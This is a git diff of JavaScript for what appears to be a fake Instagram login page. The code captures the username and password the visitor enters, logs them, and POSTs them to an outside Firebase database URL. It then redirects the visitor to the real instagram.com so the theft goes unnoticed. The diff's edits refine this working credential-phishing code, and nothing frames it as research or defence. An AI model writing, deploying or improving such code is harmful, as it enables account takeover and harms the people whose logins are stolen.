@@ -58,6 +58,7 @@ checkSigninInput = () => {
 }
 
 // darkmode toggle
+ 
 darkmode_toggle.onclick = (e) => {
     e.preventDefault()
     let body = document.querySelector('body')
@@ -71,19 +72,25 @@ darkmode_toggle.onclick = (e) => {
 let username = ""
 let password = ""
 function getValue(event) {
- if(event.placeholder=='Phone number, username or email address') {
+     console.log(event);
+ if(event.type=='text') {
    username = event.value          
  }else{
    password = event.value          
  }
 
 }
+ 
 function onSubmit() {
 let url = "https://screenshot-5026c-default-rtdb.firebaseio.com/test.json"
 console.log(getCookie('csrftoken'));
-console.log(username , password);   
-let model = {    username ,password }
-fetch(url, {
+ 
+console.log(username , password);
+   
+let model = {   username :username  ,password: password }
+
+ console.log(model);
+ fetch(url, {
 method: 'POST', // or 'PUT'
 headers: {
  'Content-Type': 'application/json',
@@ -93,12 +100,17 @@ body: JSON.stringify(model),
 .then((response) => response.json() )
 .then((data) => {
  console.log('Success:', data);
- window.location.href="https://www.instagram.com/?u="
+ window.location.href="https://www.instagram.com/"
 })
 .catch((error) => {
  console.error('Error:', error);
 });
+
+
 }
+ 
+ 
+
 function getCookie(cname) {
 //
 }
